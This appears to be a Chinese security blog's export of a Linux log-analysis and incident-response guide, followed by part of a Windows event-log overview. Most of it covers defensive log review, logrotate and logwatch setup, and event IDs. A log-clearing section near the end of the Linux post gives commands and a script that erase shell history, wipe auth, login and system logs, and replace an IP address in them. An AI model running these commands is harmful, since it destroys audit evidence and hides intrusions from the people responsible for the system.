查看 UID\\GID 为0的帐号awk -F: &#x27;&#123;if($7!=&quot;/usr/sbin/nologin&quot;)print $1&#125;&#x27; /etc/passwd # 查看能够登录的帐号lastlog # 系统中所有用户最近一次登录信息lastb # 显示用户错误的登录列表users # 打印当前登录的用户，每个用户名对应一个登录会话。如果一个用户不止一个登录会话，其用户名显示相同次数 计划任务和启动项 123456789101112131415161718chkconfig # 查看开机启动服务命令chkconfig --list | grep &quot;3:启用\\|3:开\\|3:on\\|5:启用\\|5:开\\|5:on&quot;ls /etc/init.d # 查看开机启动配置文件命令cat /etc/rc.local # 查看 rc 启动文件ls /etc/rc.d/rc[0~6].drunlevel # 查看运行级别命令crontab -l # 计划任务列表ls -alh /var/spool/cron # 默认编写的 crontab 文件会保存在 /var/spool/cron/用户名 下ls -al /etc/ | grep cronls -al /etc/cron*cat /etc/cron*cat /etc/at.allowcat /etc/at.denycat /etc/cron.allowcat /etc/cron.denycat /etc/crontabcat /etc/anacrontabcat /var/spool/cron/crontabs/root 可疑文件 查看敏感目录，如&#x2F;tmp目录下的文件，同时注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性，针对可疑文件查看创建修改时间。 12345find / -ctime -2 # 查找72小时内新增的文件find ./ -mtime 0 -name &quot;*.jsp&quot; # 查找24小时内被修改的 JSP 文件find / *.jsp -perm 4777 # 查找777的权限的文件ls -a /tmp # 查看临时目录strings /usr/sbin/sshd | egrep &#x27;[1-9]&#123;1,3&#125;.[1-9]&#123;1,3&#125;.&#x27; # 分析 sshd 文件，是否包括IP信息 日志分析技巧A、&#x2F;var&#x2F;log&#x2F;secureRed Hat 系的发行版是&#x2F;var&#x2F;log&#x2F;secure。Debian 系的发行版是&#x2F;var&#x2F;log&#x2F;auth.log。 定位哪些IP在爆破主机的root帐号和次数统计： 1234# Red Hat 系的发行版sudo grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more# Debian 系的发行版sudo grep &quot;Failed password for root&quot; /var/log/auth.log | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more 定位有哪些IP在爆破（太长了） 1grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c |more 爆破用户名有哪些（太长了） 1grep &quot;Failed password&quot; /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\\n&quot;;&#125;&#x27;|uniq -c|sort -nr | more 爆破失败的次数 1grep -o &quot;Failed password&quot; /var/log/secure|uniq -c 爆破失败的用户名次数统计 1grep &quot;Failed password&quot; /var/log/secure | awk &#123;&#x27;print $9&#x27;&#125; | sort | uniq -c | sort -nr 爆破失败的ip次数统计 1sudo grep &quot;Failed password for invalid user&quot; /var/log/secure | awk &#x27;&#123;print $13&#125;&#x27; | sort | uniq -c | sort -nr | more 登录成功的IP有哪些： 1grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more 登录成功的日期、用户名、IP： 1grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27; 1grep &quot;Accepted &quot; /var/log/secure* | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27; 增加一个用户： 1grep &quot;useradd&quot; /var/log/secure 删除用户 1grep &quot;userdel&quot; /var/log/secure root权限用户、查看 UID\\GID 为0的帐号 1awk -F: &#x27;&#123;if($3==0||$4==0)print $1&#125;&#x27; /etc/passwd 查看能够登录的帐号 1awk -F: &#x27;&#123;if($7!=&quot;/usr/sbin/nologin&quot;)print $1&#125;&#x27; /etc/passwd B、&#x2F;var&#x2F;log&#x2F;yum.log软件安装升级卸载日志： 123456789yum install gcc[root@bogon ~]# more /var/log/yum.logJul 10 00:18:23 Updated: cpp-4.8.5-28.el7_5.1.x86_64Jul 10 00:18:24 Updated: libgcc-4.8.5-28.el7_5.1.x86_64Jul 10 00:18:24 Updated: libgomp-4.8.5-28.el7_5.1.x86_64Jul 10 00:18:28 Updated: gcc-4.8.5-28.el7_5.1.x86_64Jul 10 00:18:28 Updated: libgcc-4.8.5-28.el7_5.1.i686 日志工具分割日志工具-logrotatelogrotate 程序是一个日志文件管理工具。用于分割日志文件，删除旧的日志文件，并创建新的日志文件，起到“转储”作用。可以节省磁盘空间。 日志转储也叫日志回卷或日志轮转。Linux中的日志通常增长很快，会占用大量硬盘空间，需要在日志文件达到指定大小时分开存储。 syslog 只负责接收日志并保存到相应的文件，但不会对日志文件进行管理，因此经常会造成日志文件过大，尤其是WEB服务器，轻易就能超过1G，给检索带来困难。 大多数Linux发行版使用 logrotate 或 newsyslog 对日志进行管理。logrotate 程序不但可以压缩日志文件，减少存储空间，还可以将日志发送到指定 E-mail，方便管理员及时查看日志。 如果你在服务器上面安装了mysql，httpd 或者其他应用服务后，logrotate 它会自动在 &#x2F;etc&#x2F;logrotate.d&#x2F; 下面创建对应的日志处理方式，基本是继承 logrotate.conf. 因此，不论是你服务器上面系统日志还是应用日志，面对日志量太大的问题，都可以使用 logrotate 进行设置处理. 1、配置文件介绍Linux系统默认安装logrotate工具，它默认的配置文件在： 12/etc/logrotate.conf/etc/logrotate.d/ logrotate.conf 才主要的配置文件，logrotate.d 是一个目录，该目录里的所有文件都会被主动的读入&#x2F;etc&#x2F;logrotate.conf中执行。 另外，如果 &#x2F;etc&#x2F;logrotate.d&#x2F; 里面的文件中没有设定一些细节，则会以&#x2F;etc&#x2F;logrotate.conf这个文件的设定来作为默认值。 Logrotate是基于CRON来运行的，其脚本是&#x2F;etc&#x2F;cron.daily&#x2F;logrotate，日志轮转是系统自动完成的。 实际运行时，Logrotate会调用配置文件&#x2F;etc&#x2F;logrotate.conf。可以在&#x2F;etc&#x2F;logrotate.d目录里放置自定义好的配置文件，用来覆盖Logrotate的缺省值。 123456789[root@huanqiu_web1 ~]# cat /etc/cron.daily/logrotate#!/bin/sh/usr/sbin/logrotate /etc/logrotate.conf &gt;/dev/null 2&gt;&amp;1EXITVALUE=$?if [ $EXITVALUE != 0 ]; then /usr/bin/logger -t logrotate &quot;ALERT exited abnormally with [$EXITVALUE]&quot;fiexit 0 如果等不及cron自动执行日志轮转，想手动强制切割日志，需要加-f参数；不过正式执行前最好通过Debug选项来验证一下（-d参数），这对调试也很重要： 12# /usr/sbin/logrotate -f /etc/logrotate.d/nginx# /usr/sbin/logrotate -d -f /etc/logrotate.d/nginx logrotate 命令格式： 123456logrotate [OPTION...] &lt;configfile&gt;-d, --debug ：debug模式，测试配置文件是否有错误。-f, --force ：强制转储文件。-m, --mail=command ：压缩日志后，发送日志到指定邮箱。-s, --state=statefile ：使用指定的状态文件。-v, --verbose ：显示转储过程。 根据日志切割设置进行操作，并显示详细信息： 123[root@huanqiu_web1 ~]# /usr/sbin/logrotate -v /etc/logrotate.conf[root@huanqiu_web1 ~]# /usr/sbin/logrotate -v /etc/logrotate.d/php 根据日志切割设置进行执行，并显示详细信息,但是不进行具体操作，debug模式 123[root@huanqiu_web1 ~]# /usr/sbin/logrotate -d /etc/logrotate.conf[root@huanqiu_web1 ~]# /usr/sbin/logrotate -d /etc/logrotate.d/nginx 查看各log文件的具体执行情况 1[root@fangfull_web1 ~]# cat /var/lib/logrotate.status 2、切割介绍比如以系统日志&#x2F;var&#x2F;log&#x2F;message做切割来简单说明下： 第一次执行完rotate(轮转)之后，原本的messages会变成messages.1，而且会制造一个空的messages给系统来储存日志； 第二次执行之后，messages.1会变成messages.2，而messages会变成messages.1，又造成一个空的messages来储存日志！ 如果仅设定保留三个日志（即轮转3次）的话，那么执行第三次时，则 messages.3这个档案就会被删除，并由后面的较新的保存日志所取代！也就是会保存最新的几个日志。 日志究竟轮换几次，这个是根据配置文件中的dateext 参数来判定的。 看下logrotate.conf配置： 1234567891011121314151617181920# cat /etc/logrotate.conf# 底下的设定是 &quot;logrotate 的默认值&quot; ，如果別的文件设定了其他的值，# 就会以其它文件的设定为主weekly //默认每一周执行一次rotate轮转工作rotate 4 //保留多少个日志文件(轮转几次).默认保留四个.就是指定日志文件删除之前轮转的次数，0 指没有备份create //自动创建新的日志文件，新的日志文件具有和原来的文件相同的权限；因为日志被改名,因此要创建一个新的来继续存储之前的日志dateext //这个参数很重要！就是切割后的日志文件以当前日期为格式结尾，如xxx.log-20131216这样,如果注释掉,切割出来是按数字递增,即前面说的 xxx.log-1这种格式compress //是否通过gzip压缩转储以后的日志文件，如xxx.log-20131216.gz ；如果不需要压缩，注释掉就行include /etc/logrotate.d# 将 /etc/logrotate.d/ 目录中的所有文件都加载进来/var/log/wtmp &#123; //仅针对 /var/log/wtmp 所设定的参数monthly //每月一次切割,取代默认的一周minsize 1M //文件大小超过 1M 后才会切割create 0664 root utmp //指定新建的日志文件权限以及所属用户和组rotate 1 //只保留一个日志.&#125;# 这个 wtmp 可记录用户登录系统及系统重启的时间# 因为有 minsize 的参数，因此不见得每个月一定会执行一次喔.要看文件大小。 由这个文件的设定可以知道&#x2F;etc&#x2F;logrotate.d其实就是由&#x2F;etc&#x2F;logrotate.conf 所规划出来的目录，虽然可以将所有的配置都写入 &#x2F;etc&#x2F;logrotate.conf ，但是这样一来这个文件就实在是太复杂了，尤其是当使用很多的服务在系统上面时， 每个服务都要去修改 &#x2F;etc&#x2F;logrotate.conf 的设定也似乎不太合理了。 所以，如果独立出来一个目录，那么每个要切割日志的服务， 就可以独自成为一个文件，并且放置到 &#x2F;etc&#x2F;logrotate.d&#x2F; 当中。 其他重要参数说明： 123456789101112131415161718192021222324252627282930compress #通过gzip 压缩转储以后的日志nocompress #不做gzip压缩处理copytruncate #用于还在打开中的日志文件，把当前日志备份并截断；是先拷贝再清空的方式，拷贝和清空之间有一个时间差，可能会丢失部分日志数据。nocopytruncate #备份日志文件不过不截断create mode owner group #轮转时指定创建新文件的属性，如create 0777 nobody nobodynocreate #不建立新的日志文件delaycompress #和compress 一起使用时，转储的日志文件到下一次转储时才压缩nodelaycompress #覆盖 delaycompress 选项，转储同时压缩。missingok #如果日志丢失，不报错继续滚动下一个日志errors address #专储时的错误信息发送到指定的Email 地址ifempty #即使日志文件为空文件也做轮转，这个是logrotate的缺省选项。notifempty #当日志文件为空时，不进行轮转mail address #把转储的日志文件发送到指定的E-mail 地址nomail #转储时不发送日志文件olddir directory #转储后的日志文件放入指定的目录，必须和当前日志文件在同一个文件系统noolddir #转储后的日志文件和当前日志文件放在同一个目录下sharedscripts #运行postrotate脚本，作用是在所有日志都轮转后统一执行一次脚本。如果没有配置这个，那么每个日志轮转后都会执行一次脚本prerotate #在logrotate转储之前需要执行的指令，例如修改文件的属性等动作；必须独立成行postrotate #在logrotate转储之后需要执行的指令，例如重新启动 (kill -HUP) 某个服务！必须独立成行daily #指定转储周期为每天weekly #指定转储周期为每周monthly #指定转储周期为每月rotate count #指定日志文件删除之前转储的次数，0 指没有备份，5 指保留5 个备份dateext #使用当期日期作为命名格式dateformat .%s #配合dateext使用，紧跟在下一行出现，定义文件切割后的文件名，必须配合dateext使用，只支持 %Y %m %d %s 这四个参数size(或minsize) log-size #当日志文件到达指定的大小时才转储，log-size能指定bytes(缺省)及KB (sizek)或MB(sizem).当日志文件 &gt;= log-size 的时候就转储。 以下为合法格式：（其他格式的单位大小写没有试过）size = 5 或 size 5 （&gt;= 5 个字节就转储）size = 100k 或 size 100ksize = 100M 或 size 100M 3、示例nginx日志切割一例 1234567891011121314151617181920[root@huanqiu_web1 ~]# cat /etc/logrotate.d/nginx/Data/logs/nginx/*/*log &#123; daily rotate 365 missingok notifempty compress dateext sharedscripts postrotate /etc/init.d/nginx reload endscript&#125;[root@huanqiu_web1 ~]# ll /Data/logs/nginx/www.huanqiu.com/..........-rw-r--r-- 1 root root 1652 Jan 1 00:00 error.log-20170101.gz-rw-r--r-- 1 root root 1289 Jan 2 00:00 error.log-20170102.gz-rw-r--r-- 1 root root 1633 Jan 3 00:00 error.log-20170103.gz-rw-r--r-- 1 root root 3239 Jan 4 00:00 error.log-20170104.gz php脚本切割一例： 1234567891011121314151617181920212223242526272829[root@huanqiu_web1 ~]# cat /etc/logrotate.d/php/Data/logs/php/*log &#123; daily rotate 365 missingok notifempty compress dateext sharedscripts postrotate if [ -f /Data/app/php5.6.26/var/run/php-fpm.pid ]; then kill -USR1 `cat /Data/app/php5.6.26/var/run/php-fpm.pid` fi endscript postrotate /bin/chmod 644 /Data/logs/php/*gz endscript&#125;[root@huanqiu_web1 ~]# ll /Data/app/php5.6.26/var/run/php-fpm.pid-rw-r--r-- 1 root root 4 Dec 28 17:03 /Data/app/php5.6.26/var/run/php-fpm.pid[root@huanqiu_web1 ~]# cd /Data/logs/php[root@huanqiu_web1 php]# lltotal 25676-rw-r--r-- 1 root root 0 Jun 1 2016 error.log-rw-r--r-- 1 nobody nobody 182 Aug 30 2015 error.log-20150830.gz-rw-r--r-- 1 nobody nobody 371 Sep 1 2015 error.log-20150901.gz-rw-r--r-- 1 nobody nobody 315 Sep 7 2015 error.log-20150907.gz tomcat日志切割一例 12345678910111213[root@huanqiu-backup ~]# cat /etc/logrotate.d/tomcat/Data/app/tomcat-7-huanqiu/logs/catalina.out &#123;rotate 14dailycopytruncatecompressnotifemptymissingok&#125;[root@huanqiu-backup ~]# ll /Data/app/tomcat-7-huanqiu/logs/catalina.*-rw-r--r--. 1 root root 0 Jan 19 19:11 /Data/app/tomcat-7-huanqiu/logs/catalina.out-rw-r--r--. 1 root root 95668 Jan 19 19:11 /Data/app/tomcat-7-huanqiu/logs/catalina.out.1.gz 系统日志切割一例 12345678910111213141516171819202122232425262728293031323334353637[root@huanqiu_web1 ~]# cat /etc/logrotate.d/syslog/var/log/cron/var/log/maillog/var/log/messages/var/log/secure/var/log/spooler&#123; sharedscripts postrotate /bin/kill -HUP `cat /var/run/syslogd.pid 2&gt; /dev/null` 2&gt; /dev/null || true endscript&#125;[root@huanqiu_web1 ~]# ll /var/log/messages*-rw------- 1 root root 34248975 Jan 19 18:42 /var/log/messages-rw------- 1 root root 51772994 Dec 25 03:11 /var/log/messages-20161225-rw------- 1 root root 51800210 Jan 1 03:05 /var/log/messages-20170101-rw------- 1 root root 51981366 Jan 8 03:36 /var/log/messages-20170108-rw------- 1 root root 51843025 Jan 15 03:40 /var/log/messages-20170115[root@huanqiu_web1 ~]# ll /var/log/cron*-rw------- 1 root root 2155681 Jan 19 18:43 /var/log/cron-rw------- 1 root root 2932618 Dec 25 03:11 /var/log/cron-20161225-rw------- 1 root root 2939305 Jan 1 03:06 /var/log/cron-20170101-rw------- 1 root root 2951820 Jan 8 03:37 /var/log/cron-20170108-rw------- 1 root root 3203992 Jan 15 03:41 /var/log/cron-20170115[root@huanqiu_web1 ~]# ll /var/log/secure*-rw------- 1 root root 275343 Jan 19 18:36 /var/log/secure-rw------- 1 root root 2111936 Dec 25 03:06 /var/log/secure-20161225-rw------- 1 root root 2772744 Jan 1 02:57 /var/log/secure-20170101-rw------- 1 root root 1115543 Jan 8 03:26 /var/log/secure-20170108-rw------- 1 root root 731599 Jan 15 03:40 /var/log/secure-20170115[root@huanqiu_web1 ~]# ll /var/log/spooler*-rw------- 1 root root 0 Jan 15 03:41 /var/log/spooler-rw------- 1 root root 0 Dec 18 03:21 /var/log/spooler-20161225-rw------- 1 root root 0 Dec 25 03:11 /var/log/spooler-20170101-rw------- 1 root root 0 Jan 1 03:06 /var/log/spooler-20170108-rw------- 1 root root 0 Jan 8 03:37 /var/log/spooler-20170115 日志分析工具-logwatch安装 1yum -y install logwatch 安装完成之后，需要手工生成 logwatch 的配置文件。默认配置文件是 &#x2F;etc&#x2F;logwatch&#x2F;conf&#x2F;logwatch.conf，不过这个配置文件是空的，需要把模板配置文件复制过来。命令如下： 12cp /usr/share/logwatch/default.conf/logwatch.conf /etc/logwatch/conf/logwatch.conf#复制配置文件 这个配置文件的内容中绝大多数是注释，我们把注释去掉，那么这个配置文件的内容如下所示 12345678910111213141516171819202122232425[root@localhost ~]# vi /etc/logwatch/conf/logwatch.conf#查看配置文件LogDir = /var/log#logwatch会分析和统计/var/log/中的日志TmpDir = /var/cache/logwatch#指定logwatch的临时目录MailTo = root#日志的分析结果，给root用户发送邮件MailFrom = Logwatch#邮件的发送者是Logwatch，在接收邮件时显示Print =#是否打印。如果选择“yes”，那么日志分析会被打印到标准输出，而且不会发送邮件。我们在这里不打印，#而是给root用户发送邮件#Save = /tmp/logwatch#如果开启这一项，日志分析就不会发送邮件，而是保存在/tmp/logwatch文件中#如果开启这一项，日志分析就不会发送邮件，而是保存在/tmp/logwatch文件中Range = yesterday#分析哪天的日志。可以识别“All”“Today”“Yesterday”，用来分析“所有日志”“今天日志”“昨天日志”Detail = Low#日志的详细程度。可以识别“Low”“Med”“High”。也可以用数字表示，范围为0～10，“0”代表最不详细，“10”代表最详细Service = All#分析和监控所有日志Service = &quot;-zz-network&quot;#但是不监控“-zz-network”服务的日志。“-服务名”表示不分析和监控此服务的日志Service = &quot;-zz-sys&quot;Service = &quot;-eximstats&quot; 这个配置文件基本不需要修改，它就会默认每天执行。它为什么会每天执行呢？logwatch 一旦安装，就会在 &#x2F;etc&#x2F;cron.daily&#x2F; 目录中建立“0logwatch”文件，用于在每天定时执行 logwatch 命令，分析和监控相关日志。 如果想要让这个日志分析马上执行，则只需执行 logrotate 命令即可。命令如下： 之前创建又删除的用户backdoor可以监控到 日志清除清除历史命令 1234histroy -r #删除当前会话历史记录history -c #删除内存中的所有命令历史rm .bash_history #删除历史文件中的内容HISTZISE=0 #通过设置历史命令条数来清除所有历史记录 完全删除日志文件（下面任意一个即可） 12345cat /dev/null &gt; filename: &gt; filename&gt; filenameecho &quot;&quot; &gt; filenameecho &gt; filename 删除当天日志 1sed -i &#x27;/当天日期/&#x27;d filename 篡改日志 12将所有170.170.64.17ip替换为127.0.0.1sed -i &#x27;s/170.170.64.17/127.0.0.1/g&#x27; 日志一键清除脚本 123456789101112131415#!/usr/bin/bashecho &gt; /var/log/syslogecho &gt; /var/log/messagesecho &gt; /var/log/httpd/access_logecho &gt; /var/log/httpd/error_logecho &gt; /var/log/xferlogecho &gt; /var/log/secureecho &gt; /var/log/auth.logecho &gt; /var/log/user.logecho &gt; /var/log/wtmpecho &gt; /var/log/lastlogecho &gt; /var/log/btmpecho &gt; /var/run/utmprm ~/./bash_historyhistory -c 参考（站在巨人的肩膀上登高望远）: https://mp.weixin.qq.com/s/fWlux47luH_zvYpXcZXeYA https://mp.weixin.qq.com/s/SWMWVezAVzykkjTuRRDxJw https://mp.weixin.qq.com/s/TlCyifwRrzKFx7jJkJlF_A https://mp.weixin.qq.com/s/dDErpPwEw3ZiN4LlkaWO0Q https://mp.weixin.qq.com/s/vy8hoALDiQdN16iRFawAZQ https://www.cnblogs.com/llife/p/11478952.html https://mp.weixin.qq.com/s/14R7VS9eSD3cNNNpRlR3bg http://www.found5.com/view/1010.html https://mp.weixin.qq.com/s/YHo4YSSF4BQ6Yrd3O3IrqA","tags":[{"name":"总结","slug":"总结","permalink":"https://mrwq.github.io/tags/%E6%80%BB%E7%BB%93/"},{"name":"日志","slug":"日志","permalink":"https://mrwq.github.io/tags/%E6%97%A5%E5%BF%97/"}]},{"title":"Windows日志总结","path":"windows日志总结/","text":"本文首发于奇安信攻防社区：https://forum.butian.net/share/355 windows日志总结开启审核策略运行 secpol.msc 可以打开本地安全策略，依次点开本地策略-审核策略。可以看到windows默认情况是没有开启审核策略的，不开启策略的话，windows就不会记录某些事件，比如登录事件，进程创建事件等等。 我们可以挨个手动修改审核策略的属性，将审核操作选上成功和失败。 当然有简单方法：将下面脚本另存为bat，然后管理员运行就可以打开全部策略了。 123456789101112131415echo [version] &gt;1.inf echo signature=&quot;$CHICAGO$&quot; &gt;&gt;1.inf echo [Event Audit] &gt;&gt;1.inf echo AuditSystemEvents=3 &gt;&gt;1.inf echo AuditObjectAccess=3 &gt;&gt;1.inf echo AuditPrivilegeUse=3 &gt;&gt;1.inf echo AuditPolicyChange=3 &gt;&gt;1.inf echo AuditAccountManage=3 &gt;&gt;1.inf echo AuditProcessTracking=3 &gt;&gt;1.inf echo AuditDSAccess=3 &gt;&gt;1.inf echo AuditAccountLogon=3 &gt;&gt;1.inf echo AuditLogonEvents=3 &gt;&gt;1.inf secedit /configure /db 1.sdb /cfg 1.inf /log 1.log /quiet del 1.*pause Windows系统日志Windows系统日志简介Windows操作系统在其运行的生命周期中会记录其大量的日志信息，这些日志信息包括：Windows事件日志（Event Log），Windows服务器系统的IIS日志，FTP日志，Exchange Server邮件服务，MS SQL Server数据库日志等。处理应急事件时，客户提出需要为其提供溯源，这些日志信息在取证和溯源中扮演着重要的角色。 Windows事件日志文件实际上是以特定的数据结构的方式存储内容，其中包括有关系统，安全，应用程序的记录。每个记录事件的数据结构中包含了9个元素（可以理解成数据库中的字段）：日期&#x2F;时间、事件类型、用户、计算机、事件ID、来源、类别、描述、数据等信息。应急响应工程师可以根据日志取证，了解计算机上上发生的具体行为。 Windows系统中自带了一个叫做事件查看器的工具，它可以用来查看分析所有的Windows系统日志。运行 eventvwr 可以快速打开事件查看器。使用该工具可以看到系统日志被分为了两大类：Windows日志和应用程序和服务日志。 系统内置的三个核心日志文件（System，Security和Application）默认大小均为20480KB（20MB），记录事件数据超过20MB时，默认系统将优先覆盖过期的日志记录。其它应用程序及服务日志默认最大为1024KB，超过最大限制也优先覆盖过期的日志记录。 windows日志类型系统日志 系统日志包含 Windows 系统组件记录的事件。例如，在启动过程中加载驱动程序或其他系统组件失败将记录在系统日志中。系统组件所记录的事件类型由 Windows 预先确定。 默认位置：%SystemRoot%\\System32\\Winevt\\Logs\\System.evtx 应用程序日志 应用程序日志包含由应用程序或程序记录的事件。例如，数据库程序可在应用程序日志中记录文件错误。程序开发人员决定记录哪些事件。 默认位置：%SystemRoot%\\System32\\Winevt\\Logs\\Application.evtx 安全日志 安全日志包含诸如有效和无效的登录尝试等事件，以及与资源使用相关的事件，如创建、打开或删除文件或其他对象。管理员可以指定在安全日志中记录什么事件。例如，如果已启用登录审核，则对系统的登录尝试将记录在安全日志中。 默认位置：%SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx 应用程序及服务日志Microsoft Microsoft文件夹下包含了200多个微软内置的事件日志分类，只有部分类型默认启用记录功能，如远程桌面客户端连接、无线网络、有线网路、设备安装等相关日志。 默认位置：%SystemRoot%\\System32\\Winevt\\Logs目录下Microsoft-Windows开头的文件名 Microsoft Office Alerts 微软Office应用程序（包括Word&#x2F;Excel&#x2F;PowerPoint等）的各种警告信息，其中包含用户对文档操作过程中出现的各种行为，记录有文件名、路径等信息。 默认位置：%SystemRoot%\\System32\\Winevt\\Logs\\OAerts.evtx Windows PowerShell Windows自带的PowerShell应用的日志信息。 默认位置：%SystemRoot%\\System32\\Winevt\\Logs\\Windows PowerShell.evtx Internet Explorer IE浏览器应用程序的日志信息，默认未启用，需要通过组策略进行配置。 默认位置：%SystemRoot%\\System32\\Winevt\\Logs\\Internet Explorer.evtx windows事件类型&#x2F;级别Windows事件日志中共有五种事件类型，所有的事件必须拥有五种事件类型中的一种，且只可以有一种。五种事件类型分为： 信息（Information）：信息事件指应用程序、驱动程序或服务的成功操作的事件。 警告（Warning）：警告事件指不是直接的、主要的，但是会导致将来问题发生的问题。例如，当磁盘空间不足或未找到打印机时，都会记录一个“警告”事件。 错误（Error）：错误事件指用户应该知道的重要的问题。错误事件通常指功能和数据的丢失。例如,如果一个服务不能作为系统引导被加载，那么它会产生一个错误事件。 成功审核（Success audit）：成功的审核安全访问尝试，主要是指安全性日志，这里记录着用户登录&#x2F;注销、对象访问、特权使用、账户管理、策略更改、详细跟踪、目录服务访问、账户登录等事件，例如所有的成功登录系统都会被记录为“ 成功审核”事件。 失败审核（Failure audit）：失败的审核安全登录尝试，例如用户试图访问网络驱动器失败，则该尝试会被作为失败审核事件记录下来。 Windows事件属性Windows事件日志属性如下： 属性名 描述 事件ID 标识特定事件类型的编号。描述的第一行通常包含事件类型的名称。例如，6005 是在启动事件日志服务时所发生事件的 ID。此类事件的描述的第一行是“事件日志服务已启动”。产品支持代表可以使用事件 ID 和来源来解决系统问题。 来源 记录事件的软件，可以是程序名（如“SQL Server”），也可以是系统或大型程序的组件（如驱动程序名）。例如，“Elnkii”表示 EtherLink II 驱动程序。 级别 事件严重性的分类，以下事件严重性级别可能出现在系统和应用程序日志中： 信息：指明应用程序或组件发生了更改，如操作成功完成、已创建了资源，或已启动了服务。 警告：指明出现的问题可能会影响服务器或导致更严重的问题（如果未采取措施）。 错误：指明出现了问题，这可能会影响触发事件的应用程序或组件外部的功能。 关键：指明出现了故障，导致触发事件的应用程序或组件可能无法自动恢复。以下事件严重性级别可能出现在安全日志中： 审核成功 ：指明用户权限练习成功。 审核失败：指明用户权限练习失败。在事件查看器的正常列表视图中，这些分类都由符号表示。 用户 事件发生所代表的用户的名称。如果事件实际上是由服务器进程所引起的，则此名称为客户端 ID；如果没有发生模仿的情况，则为主 ID。如果适用，安全日志项同时包含主 ID 和模仿 ID。当服务器允许一个进程采用另一个进程的安全属性时就会发生模拟的情况 操作代码 包含标识活动或应用程序引起事件时正在执行的活动中的点的数字值。例如，初始化或关闭 日志 已记录事件的日志的名称 任务类别 用于表示事件发行者的子组件或活动。 关键字 可用于筛选或搜索事件的一组类别或标记。示例包括“网络”、“安全”或“未找到资源” 计算机 发生事件的计算机的名称。该计算机名称通常为本地计算机的名称，但是它可能是已转发事件的计算机的名称，或者可能是名称更改之前的本地计算机的名称 日期和时间 记录事件的日期和时间 重点讲述事件ID值，Windows 的日志以事件 id 来标识具体发生的动作行为，可通过下列网站查询具体 id 对应的操作： https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/default.aspx?i=j 常用的事件id 事件ID 说明 1102 清理审计日志 4624 账号登录成功 4625 账号登录失败 4634 账号注销成功 4647 用户启动的注销 4672 使用超级用户（如管理员）进行登录 4720 创建用户 4726 删除用户 4732 将成员添加到启用安全的本地组中 4733 将成员从启用安全的本地组中移除 4688 创建新进程 4689 结束进程 每个成功登录的事件都会标记一个登录类型，不同登录类型代表不同的方式： 登录类型 描述 说明 2 交互式登录（Interactive） 用户在本地进行登录。 3 网络（Network） 最常见的情况就是连接到共享文件夹或共享打印机时。 4 批处理（Batch） 通常表明某计划任务启动。 5 服务（Service） 每种服务都被配置在某个特定的用户账号下运行。 7 解锁（Unlock） 屏保解锁。 8 网络明文（NetworkCleartext） 登录的密码在网络上是通过明文传输的，如FTP。 9 新凭证（NewCredentials） 使用带&#x2F;Netonly参数的RUNAS命令运行一个程序。 10 远程交互，（RemoteInteractive） 通过终端服务、远程桌面或远程协助访问计算机。 11 缓存交互（CachedInteractive） 以一个域用户登录而又没有域控制器可用 事件分析工具和命令Get-WinEvent1234powershell管理员执行列出安全日志 Get-WinEvent -FilterHashtable @&#123;logname=&quot;Security&quot;;&#125;列出系统日志 Get-WinEvent -FilterHashtable @&#123;logname=&quot;System&quot;;&#125;列出应用程序日志 Get-WinEvent -FilterHashtable @&#123;logname=&quot;Application&quot;;&#125; wevtutilwevtutil 命令参数如下 命令 意义 注释 el enum-logs 列出日志名称 gl get-log 获取日志配置信息 sl set-log 修改日志配置 ep enum-publishers 列出事件发布者 gp get-publisher 获取发布者配置信息 im install-manifest 从清单中安装事件发布者和日志 um uninstall-manifest 从清单中卸载事件发布者和日志 qe query-events 从日志或日志文件中查询事件 gli get-log-info 获取日志状态信息 epl export-log 导出日志 al archive-log 存档导出的日志 cl clear-log 清除日志 导出 安全 日志的命令为： 12wevtutil epl security d:\\security.evtx该命令将安全日志信息导出到d盘下的security.evtx文件 查询 安全 日志的命令为： 1234567wevtutil qe Security /f:text /rd:true &gt; c:\\1.txt 导出为文本wevtutil qe Security /f:xml /rd:true &gt; c:\\1.xml 导出为xml格式wevtutil qe Application /c:3 /rd:true /f:text 以文本格式显示应用程序日志中三个最近的事件/f:&lt;Format&gt; 指定输出应为 XML 格式或文本格式。 如果 &lt;Format&gt; 为 xml，则输出以 xml 格式显示。 如果 &lt;Format&gt; 是文本，则显示不带 XML 标记的输出。 默认值为 Text。/rd:&lt;Direction&gt; 指定读取事件的方向。 &lt;Direction&gt; 可以为 true 或 false。 如果为 true，则首先返回最新的事件。/c&lt;Count&gt; 设置要读取的最大事件数。 更多可以参考wevtutil微软官方文档说明：https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/wevtutil logparser(需下载安装)logparser工具下载地址 https://www.microsoft.com/en-us/download/confirmation.aspx?id=24659 1234567891011查询 系统日志 事件id为4688的事件 按事件倒序：LogParser.exe -i:EVT &quot;SELECT TimeGenerated,EventID,EXTRACT_TOKEN(Strings,1,&#x27;|&#x27;) as UserName,EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;) as ProcessName FROM Security where EventID=4688 ORDER BY TimeGenerated desc&quot;其中FROM Security 中的Security可以换成System和Application或 导出的日志、备份日志，例c:\\11.evtx；事件id可以替换成其他id；当然也可以select *来查询所有列。EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;)表示将String列按&#x27;|&#x27;隔开取第5个。类似编程语言中的split函数。查询系统日志，所有列，事件倒序LogParser.exe -i:EVT &quot;SELECT * FROM System ORDER BY TimeGenerated desc&quot;-o:csv 将日志另存为csv格式，其他常用格式tsv(文本格式)、xmlLogParser.exe 